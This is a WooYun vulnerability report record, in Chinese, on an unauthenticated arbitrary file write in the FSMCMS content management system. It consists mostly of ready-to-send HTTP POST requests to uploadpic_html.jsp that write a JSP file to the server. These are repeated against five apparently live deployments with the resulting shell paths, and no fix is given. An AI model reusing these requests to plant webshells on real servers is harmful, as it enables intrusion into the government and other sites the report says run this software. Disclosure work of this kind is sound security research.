{"id": 84574, "wybug_id": "wooyun-2015-0144274", "wybug_title": "FSMCMS系统任意文件写入漏洞", "wybug_corp": "FSMCMS", "wybug_author": "路人甲", "wybug_date": "2015-10-10 12:57", "wybug_open_date": "2015-11-24 12:58", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-11-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  北京东方文辉信息技术有限公司官网地址：http://**.**.**.**版本：通杀无需登录等认证大量政府案例：uploadpic_html.jsp文件上传使用burpsuite发包:发包内容：\nPOST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=399732FC1E9229FFDFC4590C881DF200Connection: keep-aliveContent-Type: multipart/form-data;Content-Length: 65<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>dGVzdA==</root>\n其中：dGVzdA==为base编码:test写入地址：/cms-data/temp_dir/xxxx/temp.files/xx.jsp\n案例1：**.**.**.**:8088POST /nlw/cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1Host: **.**.**.**:8088User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=399732FC1E9229FFDFC4590C881DF200Connection: keep-aliveContent-Type: multipart/form-data;Content-Length: 65<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>dGVzdA==</root>shell地址：http://**.**.**.**:8088/nlw/cms-data/temp_dir/xxxx/temp.files/xx.jsp\n\n\n\n案例2：**.**.**.**POST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=399732FC1E9229FFDFC4590C881DF200Connection: keep-aliveContent-Type: multipart/form-data;Content-Length: 65<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>dGVzdA==</root>shell地址：http://**.**.**.**/cms-data/temp_dir/xxxx/temp.files/xx.jsp\n\n\n\n案例3：http://**.**.**.**/POST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=399732FC1E9229FFDFC4590C881DF200Connection: keep-aliveContent-Type: multipart/form-data;Content-Length: 65<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>dGVzdA==</root>shell：http://**.**.**.**/cms-data/temp_dir/xxxx/temp.files/xx.jsp\n\n\n\n案例4：http://**.**.**.**/POST /cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=399732FC1E9229FFDFC4590C881DF200Connection: keep-aliveContent-Type: multipart/form-data;Content-Length: 65<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>dGVzdA==</root>shell：http://**.**.**.**/cms-data/temp_dir/xxxx/temp.files/xx.jsp\n\n\n\n案例5：http://**.**.**.**/POST /fsm/cms/client/uploadpic_html.jsp?toname=xx.jsp&diskno=xxxx HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: JSESSIONID=399732FC1E9229FFDFC4590C881DF200Connection: keep-aliveContent-Type: multipart/form-data;Content-Length: 65<?xml version=\"1.0\" encoding=\"UTF-8\"?><root>dGVzdA==</root>shell地址：http://**.**.**.**/fsm/cms-data/temp_dir/xxxx/temp.files/xx.jsp\n\n\n   漏洞证明：  如上   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}